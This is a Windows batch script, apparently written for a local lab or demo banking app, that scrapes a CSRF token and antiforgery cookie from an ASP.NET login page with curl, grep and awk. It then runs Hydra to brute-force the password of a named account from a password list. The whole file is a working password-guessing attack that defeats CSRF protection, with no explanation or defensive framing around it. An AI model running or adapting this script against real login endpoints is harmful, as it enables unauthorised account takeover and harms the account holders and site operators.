@echo off

REM GET CSRF TOKEN AND STORE COOKIE LOCALLY
for /f "tokens=*" %%x in ( 
'curl -s -c bankaccount.cookie "127.0.0.1:5000/Account/Login" ^| awk -F 'value^=' '/__RequestVerificationToken/ {print $2} ^| cut -d '"' -f2''
) do (
set CSRF=%%x
)

REM GET SESSIONID IN THE COOKIE
for /f "tokens=*" %%x in ( 
'grep ^\.AspNetCore^\.Antiforgery bankaccount.cookie ^| awk -F ' ' '{print $7}''
) do (
set SESSIONID=%%x
)

REM GET SESSIONNAME IN THE COOKIE
for /f "tokens=*" %%x in ( 
'grep ^\.AspNetCore^\.Antiforgery bankaccount.cookie ^| awk -F ' ' '{print $6}''
) do (
set SESSIONNAME=%%x
)

REM CRACK THE PASSWORD WITH HYDRA
hydra -l matthew@example.com -P passlist.txt -F -V -t 5 -s 5000 127.0.0.1 http-post-form "/Account/Login:Email=matthew@example.com&Password=^PASS^&__RequestVerificationToken=%CSRF%&RememberMe=false:S=Location\: /:H=Cookie: %SESSIONNAME%=%SESSIONID%"

pause